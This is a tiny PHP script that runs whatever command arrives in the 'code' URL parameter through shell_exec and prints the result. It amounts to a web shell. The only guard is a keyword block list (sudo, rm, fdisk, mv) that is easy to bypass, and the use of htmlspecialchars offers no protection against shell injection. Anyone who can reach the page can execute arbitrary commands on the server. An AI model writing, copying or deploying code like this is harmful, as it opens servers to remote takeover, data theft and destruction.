<?php
$comand = htmlspecialchars($_GET["code"]);
if ( strstr( $comand, 'sudo' ) or strstr( $comand, 'rm' ) or strstr( $comand, 'fdisk' ) or strstr( $comand, 'mv' )) {
    echo "Forbidden command";
}
else{
$output = shell_exec($comand);
echo "<pre>$output</pre>";
}
?>
